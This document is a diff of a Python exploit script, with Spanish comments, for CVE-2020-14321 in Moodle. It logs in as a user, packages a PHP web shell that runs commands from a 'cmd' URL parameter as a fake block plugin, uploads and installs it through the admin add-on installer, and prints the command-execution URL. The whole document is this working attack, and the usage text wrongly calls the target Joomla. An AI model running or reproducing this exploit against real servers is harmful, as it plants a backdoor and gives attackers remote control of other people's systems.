@@ -5,6 +5,7 @@ import string
 import os
 import zipfile
 import sys
+import base64
 import requests
 import re
 import argparse
@@ -16,7 +17,8 @@ proxies={}
 def random_string(stringLength=5):
     """Genera una cadena de texto aleatoria de tamaño determinado."""
     letters = string.ascii_letters
-    return ''.join(random.choice(letters) for i in range(stringLength))
+    cadena=''.join(random.choice(letters) for i in range(stringLength))
+    return cadena.lower()
 	
 
 
@@ -25,10 +27,7 @@ def crearDirectorios(cadena):
 	os.chdir(cadena)
 	fichero="version.php"
 	f = open(fichero, "w")
-	f.write("""
-		<?php 
-		$plugin->version = 2020061700;
-		$plugin->component = 'block_"""+ cadena +"';")
+	f.write("<?php\n$plugin->version = 2020061700;\n$plugin->component = 'block_"+ cadena +"';\n?>")
 	f.close()
 	
 	os.mkdir("lang")
@@ -37,8 +36,7 @@ def crearDirectorios(cadena):
 	os.chdir("en")
 	fichero2="block_" + cadena + ".php"
 	f2 = open(fichero2, "w")
-	f2.write("""
-		<?php system($_GET['cmd']); ?>""")
+	f2.write("<?php system($_GET['cmd']); ?>")
 	f2.close()
 	
 	return cadena
@@ -58,99 +56,101 @@ def crearZip(cadena):
 
 
 def conexionMoodle(url,usuario,password):
-	session=requests.Session()
-	login_url = url + '/login/index.php'
-	print('[+] Logging in to teacher')
-	r=session.get(login_url)
+	login_url = url + "/login/index.php"
+	session = requests.Session()
+	r = session.get(login_url)
 	login_token = re.findall(r'name="logintoken" value="(.*?)"', r.text)[0]
+# Datos de inicio de sesión
 	data = {
-            "anchor" : "",
-            "logintoken":login_token,
-            "username": usuario,
-            "password": password
-        	}
-	resp=session.post(login_url,data=data,proxies=proxies,headers=headers,verify=False)
-       
-       if "Recently accessed courses" not in resp.text:
-	print("[!] Teacher logins failure!")
-	sys.exit(1)
-	print("[+] Teacher logins successfully!")
+	"logintoken" : login_token,
+    	"username": usuario,
+    	"password": password
+	}
+
+# Iniciar sesión en Moodle
+
+	response = session.post(login_url, data=data)
+
+# Verificar si se ha iniciado sesión correctamente
+	if "logout" in response.text:
+    		print("Inicio de sesión exitoso")
+	else:
+    		print("Error al iniciar sesión")
 	return session
 
 
 def RCE(url,sess,command,cadena):
-    r = sess.get(url + '/admin/tool/installaddon/index.php',proxies=proxies)
-    new_sess_key=re.findall(r'"sesskey":"(.*?)"', r.text)[0]
-    itemid =re.findall(r'itemid=(\d*)', r.text)[0]
-    #print(itemid)
-    client_id = re.findall(r'"client_id":"(.*?)"', r.text)[0]
-    #print(client_id)
-    url_upload =url+"/repository/repository_ajax.php?action=upload"
-    filename=cadena + ".zip"
-    with open(cadena + ".zip", "rb") as f:
-    bytes = f.read()
-    hex_string = "".join("{:02x}".format(b) for b in bytes)
- 
-    file=binascii.unhexlify(hex_string)
-    files = {
-        'repo_upload_file': (filename, file, 'application/octet-stream'),
-        'title': (None, ''),
-        "author":(None,"Something"),
-        "license":(None,"unknown"),
-        "itemid":(None,itemid),
-        "accepted_types[]":(None,".zip"),
-        "repo_id":(None,"5"),
-        "p":(None,""),
-        "page":(None,""),
-        "env":(None,"filepicker"),
-        "sesskey" : (None,new_sess_key),
-        "client_id" :(None,client_id),
-        "maxbytes" : (None,"-1"),
-        "areamaxbytes" :(None,"-1"),
-        "ctx_id" : (None,"1"),
-        "savepath" :(None, "/")
-    }
-    r=sess.post(url_upload, files=files,proxies=proxies)
-    if "error" in r.text:
-        print("[-] Error when uploading this file, try again!")
-        sys.exit(1)
+# URL para subir un plugin
+	
+	r = sess.get(url + '/admin/tool/installaddon/index.php')
+	if r.status_code == 200:
+	
+	#itemid =re.findall(r'itemid=(\d*)', r.text)[0]
+	#file=open(cadena + ".zip", "rb")
+	#file.read()
+		new_sess_key=re.findall(r'"sesskey":"(.*?)"', r.text)[0]
+	
+		itemid = re.findall(r'name="zipfile" id="id_zipfile" value="(.*?)"', r.text)[0]
+	else:
+		print("Error al obtener la respuesta")
+# Datos del plugin
+	with open(cadena+".zip", "rb") as file:
+		z=file.read()
+		zip_file_bytes = base64.b64encode(z)
+		zip_b64 = zip_file_bytes.decode("utf-8")
+	zip_file= zip_b64.encode('utf-8')
+	zip_file_b64 = base64.decodebytes(zip_file)	
+	data_get = {"action":"upload"}
+	
+	data_file = [('repo_upload_file',(cadena+'.zip', zip_file_b64, 'application/zip'))]
+	
+	files = {	
+	"sesskey": (None,new_sess_key),
+	"repo_id": (None,"5"),
+	"itemid": [itemid, itemid],
+	"author": (None,"sergio moya"),
+	'title': (None, cadena+".zip"),
+	"ctx_id" : (None,"1"),
+	"accepted_types[]": [".zip",".zip"],
+	
+	}
+# Subir el plugin
+	url_upload =url+"/repository/repository_ajax.php"
+	response = sess.post(url_upload, params=data_get, data=files, files=data_file)	
+	print("OK")
+	print(response)
     # install zip file
-    new_url=url+"/admin/tool/installaddon/index.php"
-    data={
-        "sesskey" : new_sess_key,
-        "_qf__tool_installaddon_installfromzip_form" : "1",
-        "mform_showmore_id_general" : "0",
-        "mform_isexpanded_id_general" : "1",
-        "zipfile" : itemid,
-        "plugintype" : "",
-        "rootdir" : "",
-        "submitbutton" : "Install plugin from the ZIP file"
-        }
-    r=sess.post(new_url, data=data,proxies=proxies)
-    if "Validation successful" not in r.text:
-        print("[-] Error when validing this file, try again!")
-        sys.exit(1)
+	new_url=url+"/admin/tool/installaddon/index.php"
+	data={
+		"sesskey" : (None,new_sess_key),
+        	"_qf__tool_installaddon_installfromzip_form" : (None,"1"),
+        	"mform_showmore_id_general" : "0",
+        	"mform_isexpanded_id_general" : "1",
+        	"zipfile" : [itemid, itemid],
+        	"plugintype" : "",
+        	"rootdir" : "",
+        	"submitbutton" : "Install plugin from the ZIP file"
+	}
+	r=sess.post(new_url, data=data)
+	if "Validation successful" not in r.text:
+		print("[-] Error when validing this file, try again!")
+		sys.exit(1)
     # Confirm load
-    zip_storage = re.findall(r'installzipstorage=(.*?)&', r.url)[0]
-    data = {
-        "installzipcomponent" : "block_" + cadena,
-        "installzipstorage" : zip_storage,
-        "installzipconfirm" : "1",
-        "sesskey" : new_sess_key
-    }
+	zip_storage = re.findall(r'installzipstorage=(.*?)&', r.url)[0]
+	data = {
+        	"installzipcomponent" : "block_"+cadena,
+        	"installzipstorage" : zip_storage,
+		"installzipconfirm" : "1",
+        	"sesskey" : new_sess_key
+	}
 
-    r = sess.post(url + '/admin/tool/installaddon/index.php', data=data)
-    if "Current release information" not in r.text:
-        print("[-] Error when confirming this file, try again!")
-        sys.exit(1)
-    # Done, now trigger RCE
-    print("[+] Checking RCE ...")
-    link_rce=url+"/blocks/"+cadena+"/lang/en/block_"+ cadena +".php?cmd="+command
-    r=sess.get(link_rce,proxies=proxies)
-    print("[+] RCE link in here:\n"+link_rce)
-    print(r.text)
+	r = sess.post(url + '/admin/tool/installaddon/index.php', data=data)
+	if "Current release information" not in r.text:
+		print("[-] Error when confirming this file, try again!")
+		sys.exit(1)
 
 
+	print("/blocks/"+cadena+"/lang/en/block_"+cadena+".php?cmd="+command)
 if __name__ == '__main__':
 	
 	print("""                           ***CVE 2020 14321*** 
@@ -159,30 +159,30 @@ if __name__ == '__main__':
     python3 cve202014321.py -u http://test.local:8080 -u teacher -p 1234 -cmd dir
     """)
     # Construct the argument parser
-    	ap = argparse.ArgumentParser()
+	ap = argparse.ArgumentParser()
     # Add the arguments to the parser
-    	ap.add_argument("-url", "--url", required=True,
+	ap.add_argument("-url", "--url", required=True,
                     help=" URL for your Joomla target")
-    	ap.add_argument("-u", "--username",
+	ap.add_argument("-u", "--username",
                     help="username")
-    	ap.add_argument("-p", "--password",
+	ap.add_argument("-p", "--password",
                     help="password")
-    	ap.add_argument("-cmd", "--command", default="whoami",
+	ap.add_argument("-cmd", "--command", default="whoami",
                     help="command")
-    	args = vars(ap.parse_args())
+	args = vars(ap.parse_args())
     # target
-    	url = format(str(args['url']))
-    print ('[+] Your target: ' + url)
+	url = format(str(args['url']))
+	print ('[+] Your target: ' + url)
     # username
-    	uname = format(str(args['username']))
+	uname = format(str(args['username']))
     # password
-    	upass = format(str(args['password']))
+	upass = format(str(args['password']))
     # command
-    	command = format(str(args['command']))
+	command = format(str(args['command']))
     # session
-    	cadena=random_string()
-    	sess=conexionMoodle(url,uname,upass,cadena)
-    #privilegeEscalationToManagerCourse(url,sess)
-    	RCE(url,sess,command)
+	cadena=random_string()
 	direct=crearDirectorios(cadena)
 	crearZip(direct)
+	sess=conexionMoodle(url,uname,upass)
+    #privilegeEscalationToManagerCourse(url,sess)
+	RCE(url,sess,command,cadena)
